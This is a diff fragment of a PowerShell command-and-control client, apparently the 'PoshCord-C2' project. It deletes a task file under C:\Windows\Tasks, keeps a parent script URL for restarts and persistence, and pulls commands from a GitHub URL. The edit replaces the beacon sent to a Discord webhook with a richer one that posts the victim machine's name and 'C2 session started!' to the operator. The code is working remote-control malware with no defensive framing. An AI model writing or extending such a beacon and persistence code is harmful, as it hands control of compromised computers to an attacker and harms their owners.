@@ -77,14 +77,34 @@ if(Test-Path "C:\Windows\Tasks\service.vbs"){
     rm -path "C:\Windows\Tasks\service.vbs" -Force
 }
 
-$version = "1.7.0" # Current Version
 $parent = "https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1" # parent script URL (for restarts and persistance)
 $response = Invoke-RestMethod -Uri $GHurl
 $previouscmd = $response
 
 $noraw = $ghurl -replace "/raw", ""
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":link: ``Enter Commands Here`` - $noraw :link:"} | ConvertTo-Json
-Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
+$timestamp = Get-Date -Format "dd/MM/yyyy  @  HH:mm"
+$jsonPayload = @{
+    content    = " $env:COMPUTERNAME C2 session started!"
+    avatar_url = "https://i.ibb.co/vJh2LDp/img.png"
+    tts        = $false
+    embeds     = @(
+        @{
+            title       = "$env:COMPUTERNAME C2 session started!"
+            description = ":link: ``Enter Commands Here`` - $noraw :link:"
+            color       = 16711680
+            author      = @{
+                name     = "egieb"
+                url      = "https://github.com/beigeworm"
+                icon_url = "https://i.ibb.co/vJh2LDp/img.png"
+            }
+            footer      = @{
+                text = "$timestamp"
+            }
+        }
+    )
+}
+$jsonString = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonString -ContentType 'application/json'
 
 Function Options{
 $msgsys = "``========================================================
